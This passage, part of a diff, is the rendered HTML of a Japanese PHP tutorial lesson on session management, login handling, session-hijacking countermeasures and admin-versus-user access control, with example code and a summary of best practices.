+    $_SESSION[&#x27;chk_ssid&#x27;]  = session_id();
+    $_SESSION[&#x27;kanri_flg&#x27;] = $val[&#x27;kanri_flg&#x27;];
+    $_SESSION[&#x27;name&#x27;]      = $val[&#x27;name&#x27;];
+    $_SESSION[&#x27;user_id&#x27;]   = $val[&#x27;id&#x27;];
+    
+    // セキュリティ情報を記録
+    $_SESSION[&#x27;ip_address&#x27;] = $_SERVER[&#x27;REMOTE_ADDR&#x27;];
+    $_SESSION[&#x27;user_agent&#x27;] = $_SERVER[&#x27;HTTP_USER_AGENT&#x27;];
+    $_SESSION[&#x27;login_time&#x27;] = time();
+    $_SESSION[&#x27;last_activity&#x27;] = time();
+    
+    // セッションIDを再生成
+    session_regenerate_id(true);
+    $_SESSION[&#x27;chk_ssid&#x27;] = session_id();
+    
+    redirect(&#x27;select.php&#x27;);
+} else {
+    // ログイン失敗
+    redirect(&#x27;login.php&#x27;);
+}
+?&gt;
+</code></pre></div></div><p class="my-2 text-slate-700 dark:text-slate-300 leading-relaxed"><strong class="font-semibold text-slate-900 dark:text-slate-100">セキュアな認証フローの完成：</strong></p><div class="my-6 p-4 rounded-lg border border-slate-200 dark:border-slate-700 bg-slate-50/30 dark:bg-slate-800/30"><div class="text-center text-slate-500 dark:text-slate-400 text-sm py-4">図表を読み込み中...</div><div class="text-center w-full flex justify-center hidden"></div></div><div class="my-6 p-4 rounded-lg border bg-emerald-50 dark:bg-emerald-900/20 border-emerald-200 dark:border-emerald-800 flex gap-3"><div class="flex-shrink-0"><svg class="w-5 h-5 text-emerald-600 dark:text-emerald-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg></div><div class="flex-1 min-w-0"><div class="font-semibold mb-1 text-emerald-800 dark:text-emerald-200">セキュアな認証システム完成</div><div class="text-slate-700 dark:text-slate-300"><p class="my-2 text-slate-700 dark:text-slate-300 leading-relaxed">これで以下の要素を含む、実用レベルの認証システムが完成しました：</p><ul class="mb-4 space-y-1 text-slate-700 dark:text-slate-300 pl-6 list-disc">
+<li class="relative ml-2">ハッシュ化されたパスワード</li>
+<li class="relative ml-2">セッション管理</li>
+<li class="relative ml-2">セッションハイジャック対策</li>
+<li class="relative ml-2">適切なアクセス制御</li>
+<li class="relative ml-2">権限管理</li>
+</ul></div></div></div></div></details>
+<h2 class="text-2xl font-semibold mb-3 mt-12 text-slate-800 dark:text-slate-200">権限管理とアクセス制御</h2>
+<details class="rounded-lg border border-slate-200 dark:border-slate-700 px-4 py-4 my-4 hover:shadow transition outline-none focus:ring-0 focus:outline-none"><summary class="cursor-pointer select-none text-slate-700 dark:text-slate-300 hover:text-slate-900 dark:hover:text-slate-100 font-bold">管理者・一般ユーザーの区別</summary><div class="mt-6 text-slate-600 dark:text-slate-400"><p class="my-2 text-slate-700 dark:text-slate-300 leading-relaxed"><strong class="font-semibold text-slate-900 dark:text-slate-100">権限による表示内容の変更：</strong></p><div><div class="group relative my-4 rounded-lg overflow-hidden border border-slate-200 dark:border-slate-700"><button class="absolute right-2 top-2 rounded bg-slate-800/70 px-2 py-1 text-xs text-white opacity-0 transition-opacity group-hover:opacity-100 z-10">コピー</button><pre class="language-php !m-0 !p-4 !bg-slate-900 dark:!bg-slate-950 !text-slate-100 overflow-x-auto"><code class="language-php">&lt;?php
+// select.php での権限チェック
+session_start();
+include(&quot;funcs.php&quot;);
+sschk();
+
+$pdo = db_conn();
+$stmt = $pdo-&gt;prepare(&quot;SELECT * FROM gs_an_table ORDER BY indate DESC&quot;);
+$status = $stmt-&gt;execute();
+
+$view = &quot;&quot;;
+if ($status == false) {
+    sql_error($stmt);
+} else {
+    while ($r = $stmt-&gt;fetch(PDO::FETCH_ASSOC)) {
+        $view .= &#x27;&lt;div class=&quot;record&quot;&gt;&#x27;;
+        
+        // 編集リンク（全ユーザー）
+        $view .= &#x27;&lt;a href=&quot;detail.php?id=&#x27; . h($r[&quot;id&quot;]) . &#x27;&quot; class=&quot;edit-link&quot;&gt;&#x27;;
+        $view .= h($r[&quot;name&quot;]) . &quot; | &quot; . h($r[&quot;email&quot;]) . &quot; | &quot; . h($r[&quot;indate&quot;]);
+        $view .= &#x27;&lt;/a&gt;&#x27;;
+        
+        // 削除リンク（管理者のみ）
+        if ($_SESSION[&#x27;kanri_flg&#x27;] == 1) {
+            $view .= &#x27;&lt;a href=&quot;delete.php?id=&#x27; . h($r[&quot;id&quot;]) . &#x27;&quot; class=&quot;delete-link&quot; &#x27;;
+            $view .= &#x27;onclick=&quot;return confirm(\&#x27;本当に削除しますか？\&#x27;)&quot;&gt;&#x27;;
+            $view .= &#x27;[削除]&#x27;;
+            $view .= &#x27;&lt;/a&gt;&#x27;;
+        }
+        
+        $view .= &#x27;&lt;/div&gt;&#x27;;
+    }
+}
+?&gt;
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;データ一覧&lt;/title&gt;
+    &lt;style&gt;
+        .admin-only { 
+            background-color: #fff3cd; 
+            border: 1px solid #ffeaa7; 
+            padding: 10px; 
+            margin: 10px 0; 
+        }
+        .record { 
+            display: flex; 
+            justify-content: space-between; 
+            align-items: center; 
+            padding: 10px; 
+            border: 1px solid #ddd; 
+            margin: 5px 0; 
+        }
+        .delete-link { 
+            color: #d32f2f; 
+            text-decoration: none; 
+            padding: 5px 10px; 
+            border: 1px solid #d32f2f; 
+            border-radius: 3px; 
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h1&gt;データ一覧&lt;/h1&gt;
+    
+    &lt;!-- 権限表示 --&gt;
+    &lt;div class=&quot;user-info&quot;&gt;
+        ようこそ、&lt;?= h($_SESSION[&#x27;name&#x27;]) ?&gt;さん
+        &lt;?php if ($_SESSION[&#x27;kanri_flg&#x27;] == 1): ?&gt;
+            &lt;span class=&quot;admin-badge&quot;&gt;管理者&lt;/span&gt;
+        &lt;?php else: ?&gt;
+            &lt;span class=&quot;user-badge&quot;&gt;一般ユーザー&lt;/span&gt;
+        &lt;?php endif; ?&gt;
+    &lt;/div&gt;
+    
+    &lt;!-- 管理者限定機能 --&gt;
+    &lt;?php if ($_SESSION[&#x27;kanri_flg&#x27;] == 1): ?&gt;
+        &lt;div class=&quot;admin-only&quot;&gt;
+            &lt;h3&gt;管理者機能&lt;/h3&gt;
+            &lt;ul&gt;
+                &lt;li&gt;&lt;a href=&quot;user_management.php&quot;&gt;ユーザー管理&lt;/a&gt;&lt;/li&gt;
+                &lt;li&gt;&lt;a href=&quot;system_settings.php&quot;&gt;システム設定&lt;/a&gt;&lt;/li&gt;
+                &lt;li&gt;&lt;a href=&quot;backup.php&quot;&gt;データバックアップ&lt;/a&gt;&lt;/li&gt;
+            &lt;/ul&gt;
+        &lt;/div&gt;
+    &lt;?php endif; ?&gt;
+    
+    &lt;!-- データ一覧 --&gt;
+    &lt;?= $view ?&gt;
+    
+    &lt;div class=&quot;actions&quot;&gt;
+        &lt;a href=&quot;index.php&quot;&gt;新規登録&lt;/a&gt; | 
+        &lt;a href=&quot;logout.php&quot;&gt;ログアウト&lt;/a&gt;
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre></div></div><div class="my-6 p-4 rounded-lg border bg-green-50 dark:bg-green-900/20 border-green-200 dark:border-green-800 flex gap-3"><div class="flex-shrink-0"><svg class="w-5 h-5 text-green-600 dark:text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9.663 17h4.673M12 3v1m6.364 1.636l-.707.707M21 12h-1M4 12H3m3.343-5.657l-.707-.707m2.828 9.9a5 5 0 117.072 0l-.548.547A3.374 3.374 0 0014 18.469V19a2 2 0 11-4 0v-.531c0-.895-.356-1.754-.988-2.386l-.548-.547z"></path></svg></div><div class="flex-1 min-w-0"><div class="font-semibold mb-1 text-green-800 dark:text-green-200">権限管理のベストプラクティス</div><div class="text-slate-700 dark:text-slate-300"><ul class="mb-4 space-y-1 text-slate-700 dark:text-slate-300 pl-6 list-disc">
+<li class="relative ml-2"><strong class="font-semibold text-slate-900 dark:text-slate-100">最小権限の原則</strong>: ユーザーには必要最小限の権限のみ付与</li>
+<li class="relative ml-2"><strong class="font-semibold text-slate-900 dark:text-slate-100">明確な権限表示</strong>: 現在の権限レベルを画面に表示</li>
+<li class="relative ml-2"><strong class="font-semibold text-slate-900 dark:text-slate-100">サーバーサイドでの制御</strong>: JavaScriptでの権限制御は不十分</li>
+<li class="relative ml-2"><strong class="font-semibold text-slate-900 dark:text-slate-100">ログ記録</strong>: 重要な操作はログに記録</li>
+</ul></div></div></div></div></details>
+<h2 class="text-2xl font-semibold mb-3 mt-12 text-slate-800 dark:text-slate-200">まとめ・次のステップ</h2>
+<details class="rounded-lg border border-slate-200 dark:border-slate-700 px-4 py-4 my-4 hover:shadow transition outline-none focus:ring-0 focus:outline-none"><summary class="cursor-pointer select-none text-slate-700 dark:text-slate-300 hover:text-slate-900 dark:hover:text-slate-100 font-bold">今回学んだこと</summary><div class="mt-6 text-slate-600 dark:text-slate-400"><div class="my-6 "><div class="infographic-content"><div class="space-y-3"><div class="flex items-start p-3 bg-slate-50 rounded border border-slate-200"><div class="w-6 h-6 text-blue-600 mr-3 mt-0.5"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1721 9z"></path></svg></div><div><div class="font-medium text-slate-800">セッション管理</div><div class="text-sm text-slate-600">ユーザー状態の保持とHTTPステートレス問題の解決</div></div></div><div class="flex items-start p-3 bg-slate-50 rounded border border-slate-200"><div class="w-6 h-6 text-green-600 mr-3 mt-0.5"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.5-1.5a3 3 0 11-6 0 3 3 0 016 0z"></path></svg></div><div><div class="font-medium text-slate-800">ユーザー認証</div><div class="text-sm text-slate-600">ログイン・ログアウト・権限管理の完全実装</div></div></div><div class="flex items-start p-3 bg-slate-50 rounded border border-slate-200"><div class="w-6 h-6 text-orange-600 mr-3 mt-0.5"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg></div><div><div class="font-medium text-slate-800">セキュリティ対策</div><div class="text-sm text-slate-600">セッションハイジャック防止とパスワードハッシュ化</div></div></div><div class="flex items-start p-3 bg-slate-50 rounded border border-slate-200"><div class="w-6 h-6 text-purple-600 mr-3 mt-0.5"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0zm6 3a2 2 0 11-4 0 2 2 0 014 0zM7 10a2 2 0 11-4 0 2 2 0 014 0z"></path></svg></div><div><div class="font-medium text-slate-800">権限管理</div><div class="text-sm text-slate-600">管理者・一般ユーザーの適切な機能制限</div></div></div></div></div></div></div></details></div><div></div></div></main></div></div><script>((storageKey2, restoreKey) => {
+    if (!window.history.state || !window.history.state.key) {
+      let key = Math.random().toString(32).slice(2);
+      window.history.replaceState({ key }, "");
+    }
+    try {
+      let positions = JSON.parse(sessionStorage.getItem(storageKey2) || "{}");
+      let storedY = positions[restoreKey || window.history.state.key];
+      if (typeof storedY === "number") {
+        window.scrollTo(0, storedY);
+      }
+    } catch (error) {
+      console.error(error);
+      sessionStorage.removeItem(storageKey2);
+    }
+  })("react-router-scroll-positions", null)</script><script>window.__reactRouterContext = {"basename":"/gs-textbook-php","future":{"unstable_middleware":false,"unstable_optimizeDeps":false,"unstable_splitRouteModules":false,"unstable_subResourceIntegrity":false,"unstable_viteEnvironmentApi":false},"routeDiscovery":{"mode":"initial"},"ssr":false,"isSpaMode":false};window.__reactRouterContext.stream = new ReadableStream({start(controller){window.__reactRouterContext.streamController = controller;}}).pipeThrough(new TextEncoderStream());</script><script type="module" async="">import "/gs-textbook-php/assets/manifest-3e21a0cd.js";
+import * as route0 from "/gs-textbook-php/assets/root-DhgomBNp.js";
+import * as route1 from "/gs-textbook-php/assets/lessons._slug-DdYyauY5.js";
+  
+  window.__reactRouterRouteModules = {"root":route0,"routes/lessons.$slug":route1};
+
+import("/gs-textbook-php/assets/entry.client-DtWayQEr.js");</script><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script><!--$?--><template id="B:0"></template><!--/$--><div hidden id="S:0"><script>window.__reactRouterContext.streamController.enqueue("[{\"_1\":2,\"_3\":-5,\"_4\":-5},\"loaderData\",{},\"actionData\",\"errors\"]\n");</script><!--$?--><template id="B:1"></template><!--/$--></div><script>$RC=function(b,c,e){c=document.getElementById(c);c.parentNode.removeChild(c);var a=document.getElementById(b);if(a){b=a.previousSibling;if(e)b.data="$!",a.setAttribute("data-dgst",e);else{e=b.parentNode;a=b.nextSibling;var f=0;do{if(a&&8===a.nodeType){var d=a.data;if("/$"===d)if(0===f)break;else f--;else"$"!==d&&"$?"!==d&&"$!"!==d||f++}d=a.nextSibling;e.removeChild(a);a=d}while(a);for(;c.firstChild;)e.insertBefore(c.firstChild,a);b.data="$"}b._reactRetry&&b._reactRetry()}};$RC("B:0","S:0")</script><div hidden id="S:1"><script>window.__reactRouterContext.streamController.close();</script></div><script>$RC("B:1","S:1")</script></body></html>
